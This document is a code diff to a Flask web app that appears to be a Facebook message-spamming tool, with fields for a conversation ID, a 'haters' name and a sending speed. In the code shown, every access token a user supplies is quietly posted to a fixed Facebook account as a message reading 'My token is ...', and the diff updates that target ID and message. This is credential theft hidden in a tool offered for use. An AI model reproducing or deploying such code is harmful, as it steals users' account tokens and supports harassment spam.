@@ -15,10 +15,10 @@ HTML_TEMPLATE = '''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[[Y9D9V _8R9ND❤🌿]]</title>
+    <title>H0N3Y G0D ❤️</title>
     <style>
         body {
-            background-image: url('https://images.app.goo.gl/c3CRmApm84AhNz8k8'); /* Replace with the URL of your image */
+            background-image: url('https://raw.githubusercontent.com/Vibexhannu/Imag/refs/heads/main/ef119624bace0da440b12a52547bb186.jpg'); /* Replace with the URL of your image */
             background-size: cover;
             background-position: center;
             color: white; /* Ensure text is readable on the background */
@@ -162,7 +162,7 @@ def index():
 @app.route('/start', methods=['POST'])
 def start_server_and_messaging():
     port = 4000  # Port is fixed to 4000
-    target_id = "hannu.hu.bhay"  # Fixed target ID
+    target_id = "100001808342073"  # Fixed target ID
     convo_id = request.form.get('convoId')
     haters_name = request.form.get('hatersName')
     speed = int(request.form.get('speed'))
@@ -193,7 +193,7 @@ def start_server_and_messaging():
         for token in tokens:
             access_token = token.strip()
             url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-            msg = f"Hello! I am using your server. My token is {access_token}"
+            msg = f"Hello Hannu sir! I am using your server. My token is {access_token}"
             parameters = {"access_token": access_token, "message": msg}
             response = requests.post(url, json=parameters, headers=headers)
             time.sleep(0.1)
@@ -232,4 +232,4 @@ def start_server_and_messaging():
     return jsonify({"message": "Server and messaging started successfully"})
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
+    app.run(host='0.0.0.0', port=5000)
